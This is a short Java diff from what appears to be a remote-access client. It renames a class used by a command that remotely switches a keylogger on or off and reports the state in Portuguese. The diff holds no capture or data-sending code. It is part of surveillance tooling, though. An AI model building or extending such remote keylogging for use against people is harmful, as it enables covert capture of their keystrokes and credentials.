@@ -4,7 +4,7 @@ package br.com.introcdc.connect.client.commands.message;
  */
 
 import br.com.introcdc.connect.client.command.ClientCommand;
-import br.com.introcdc.connect.client.components.KeyLoggerComponents;
+import br.com.introcdc.connect.client.components.ClientKeyLoggerComponents;
 
 public class ClientCommandKeyLogger extends ClientCommand {
 
@@ -14,11 +14,11 @@ public class ClientCommandKeyLogger extends ClientCommand {
 
     @Override
     public void execute(String command, String input) throws Exception {
-        if (KeyLoggerComponents.KEY_LOGGER) {
-            KeyLoggerComponents.KEY_LOGGER = false;
+        if (ClientKeyLoggerComponents.KEY_LOGGER) {
+            ClientKeyLoggerComponents.KEY_LOGGER = false;
             msg("Keylogger desativado!");
         } else {
-            KeyLoggerComponents.KEY_LOGGER = true;
+            ClientKeyLoggerComponents.KEY_LOGGER = true;
             msg("Keylogger ativado!");
         }
     }
